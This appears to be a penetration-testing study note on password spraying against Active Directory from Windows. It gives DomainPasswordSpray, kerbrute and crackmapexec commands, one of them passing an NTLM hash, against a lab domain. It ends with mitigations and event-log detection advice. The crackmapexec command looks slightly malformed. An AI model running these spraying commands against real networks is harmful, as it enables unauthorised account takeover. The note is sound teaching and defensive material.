---
title: Attacking Active Directory from Windows
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# Attacking Active Directory from Windows


[Index of Active Directory](active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)


## Password spraying

### DomainPasswordSpray

[See DomainPasswordSpray](domainpasswordspray.md)

```powershell-session
Import-Module .\DomainPasswordSpray.ps1

# Authenticated in the domain:
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

# Not authenticated in the domain:
Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### kerbrute

```
./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

### crackmapexec

```powershell
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```


### Mitigation techniques against password spraying

- Multi-factor Authentication	
- Restricting Access
- Reducing Impact of Successful Exploitation
- Password Hygiene

In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.

